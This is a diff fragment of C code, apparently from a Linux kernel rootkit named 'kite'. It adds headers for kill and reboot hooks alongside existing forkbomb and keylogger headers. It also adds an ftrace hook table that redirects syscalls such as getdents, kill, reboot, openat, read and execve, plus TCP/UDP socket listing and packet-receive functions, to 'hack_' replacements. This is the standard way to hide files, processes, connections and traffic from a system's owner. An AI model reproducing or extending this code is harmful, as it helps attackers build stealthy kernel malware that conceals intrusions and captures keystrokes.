@@ -16,11 +16,53 @@
     #include "netfilter_kite.h"
     #include "forkbomb.h"
     #include "keylogger.h"
+    #include "kite_hook.h"
+    #include "reboot_kite.h"
+    #include "kill_kite.h"
 
 
 #define DEVICE_SIZE 1024 // size of possible input in bytes
 char last_data[DEVICE_SIZE] = "no data has been written yet"; // last written data from userspace
 
+#ifdef PTREGS_SYSCALL_STUB
+static struct ftrace_hook ACTIVE_HOOKS[] = {
+    HOOK("__x64_sys_getdents64", hack_getdents64, &orig_getdents64),
+    HOOK("__x64_sys_getdents", hack_getdents, &orig_getdents),
+    HOOK("__x64_sys_kill", hack_kill, &orig_kill),
+    HOOK("__x64_sys_reboot", hack_reboot, &orig_reboot),
+    HOOK("__x64_sys_openat", hack_openat, &orig_openat),
+    HOOK("__x64_sys_pread64", hack_pread64, &orig_pread64),
+    HOOK("__x64_sys_statx", hack_statx, &orig_statx),
+    HOOK("__x64_sys_read", hack_read, &orig_read),
+    HOOK("__x64_sys_execve", hack_execve, &orig_execve),
+    HOOK("tcp4_seq_show", hack_tcp4_seq_show, &orig_tcp4_seq_show),
+    HOOK("tcp6_seq_show", hack_tcp6_seq_show, &orig_tcp6_seq_show),
+    HOOK("udp4_seq_show", hack_udp4_seq_show, &orig_udp4_seq_show),
+    HOOK("udp6_seq_show", hack_udp6_seq_show, &orig_udp6_seq_show),
+    HOOK("packet_rcv", hack_packet_rcv, &orig_packet_rcv),
+    HOOK("tpacket_rcv", hack_tpacket_rcv, &orig_tpacket_rcv),
+    HOOK("packet_rcv_spkt", hack_packet_rcv_spkt, &orig_packet_rcv_spkt)
+};
+#else
+static struct ftrace_hook ACTIVE_HOOKS[] = {
+    HOOK("sys_getdents64", hack_getdents64, &orig_getdents64),
+    HOOK("sys_getdents", hack_getdents, &orig_getdents),
+    HOOK("sys_kill", hack_kill, &orig_kill),
+    HOOK("sys_read", hack_read, &orig_read),
+    HOOK("sys_reboot", hack_reboot, &orig_reboot),
+    HOOK("sys_openat", hack_openat, &orig_openat),
+    HOOK("sys_pread64", hack_pread64, &orig_pread64),
+    HOOK("sys_statx", hack_statx, &orig_statx),
+    HOOK("sys_execve", hack_execve, &orig_execve),
+    HOOK("tcp4_seq_show", hack_tcp4_seq_show, &orig_tcp4_seq_show),
+    HOOK("tcp6_seq_show", hack_tcp6_seq_show, &orig_tcp6_seq_show),
+    HOOK("udp4_seq_show", hack_udp4_seq_show, &orig_udp4_seq_show),
+    HOOK("udp6_seq_show", hack_udp6_seq_show, &orig_udp6_seq_show),
+    HOOK("packet_rcv", hack_packet_rcv, &orig_packet_rcv),
+    HOOK("tpacket_rcv", hack_tpacket_rcv, &orig_tpacket_rcv),
+    HOOK("packet_rcv_spkt", hack_packet_rcv_spkt, &orig_packet_rcv_spkt)
+};
+#endif
 
 ssize_t reader(struct file *filep, char *buff, size_t count, loff_t *offp)
 {
